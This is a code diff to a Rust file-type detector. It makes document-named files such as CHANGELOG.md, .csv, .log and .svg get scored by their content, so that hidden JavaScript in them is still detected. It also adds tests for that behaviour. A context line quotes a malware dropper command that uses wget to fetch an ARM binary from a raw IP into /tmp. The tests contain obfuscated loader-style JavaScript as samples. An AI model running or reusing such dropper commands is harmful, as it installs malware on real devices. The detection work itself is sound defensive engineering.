@@ -1477,7 +1477,18 @@ fn prose_extension_may_be_source(path: &Path) -> bool {
     let Some(ext) = path.extension().and_then(|e| e.to_str()) else {
         return false;
     };
-    ext.eq_ignore_ascii_case("txt") || ext.eq_ignore_ascii_case("text")
+    // `.txt` and `.md` name a document. The body is still scored first; the
+    // extension is only the fallback when that score finds no language.
+    // `.rmd` / `.qmd` stay markdown: those formats are prose with code chunks.
+    ext.eq_ignore_ascii_case("txt")
+        || ext.eq_ignore_ascii_case("text")
+        || ext.eq_ignore_ascii_case("md")
+        || ext.eq_ignore_ascii_case("markdown")
+        || ext.eq_ignore_ascii_case("rst")
+        || ext.eq_ignore_ascii_case("adoc")
+        || ext.eq_ignore_ascii_case("csv")
+        || ext.eq_ignore_ascii_case("tsv")
+        || ext.eq_ignore_ascii_case("log")
 }
 
 /// True when a path's trailing dot-segment is a real extension rather than the
@@ -1783,6 +1794,16 @@ pub fn detect(path: &Path, data: &[u8]) -> Option<Detection> {
                 file_type: unclaimed_body_type(data),
                 source: DetectionSource::Heuristic,
                 ext_match: ExtensionMatch::Different(file_type),
+            });
+        }
+        // SVG magic is decided in stage 1. Reaching this fallback means the
+        // body has no `<svg>` root, so the name is not a reason to call it an
+        // image. `logo.svg` containing a script is the script.
+        if file_type == FileType::Svg {
+            return Some(Detection {
+                file_type: unclaimed_body_type(data),
+                source: DetectionSource::Heuristic,
+                ext_match: ExtensionMatch::Different(FileType::Svg),
             });
         }
         // HTML extension requires content validation. Use the extended window:
@@ -2421,6 +2442,16 @@ cd /tmp || /var/tmp; rm avtech.arm7; wget http://193.243.147.115/avtech.arm7; ch
         jet.extend_from_slice(b"Standard Jet DB\0");
         jet.resize(2048, 0);
         assert_detect("Virus.MSAccess.Poison.c", &jet, FileType::Data);
+    }
+
+    #[test]
+    fn markdown_named_javascript_is_javascript() {
+        let js = b"const _0x5789f0=_0x14df;(function(_0x27cbc2,_0x20e97b){\n\
+const fs=require('fs');\nfunction loadAsar(){return require('asar');}\n\
+function loadBytenode(){return require('bytenode');}\n})();\n";
+        assert_detect("CHANGELOG.md", js, FileType::JavaScript);
+        let readme = b"# Notes\n\nInstall with `npm install foo`.\n\nSee the docs.\n";
+        assert_detect("README.md", readme, FileType::Markdown);
     }
 
     #[test]
@@ -3264,7 +3295,34 @@ Coordinate with the Applet Maintainer before sweeping changes.\n";
 
     #[test]
     fn svg_by_ext() {
-        assert_ext("logo.svg", FileType::Svg);
+        assert_detect(
+            "logo.svg",
+            b"<svg xmlns=\"http://www.w3.org/2000/svg\"></svg>",
+            FileType::Svg,
+        );
+    }
+
+    #[test]
+    fn document_names_do_not_hide_javascript() {
+        let js = b"const _0x5789f0=_0x14df;(function(_0x27cbc2){\n\
+const fs=require('fs');\nfunction loadAsar(){return require('asar');}\n\
+function loadBytenode(){return require('bytenode');}\n})();\n";
+        for path in [
+            "notes.rst",
+            "readme.adoc",
+            "app.log",
+            "rows.csv",
+            "rows.tsv",
+            "icon.svg",
+        ] {
+            assert_detect(path, js, FileType::JavaScript);
+        }
+        assert_detect(
+            "notes.rst",
+            b"Title\n=====\n\nJust a paragraph.\n",
+            FileType::Text,
+        );
+        assert_detect("rows.csv", b"name,count\nalice,1\n", FileType::Text);
     }
 
     #[test]
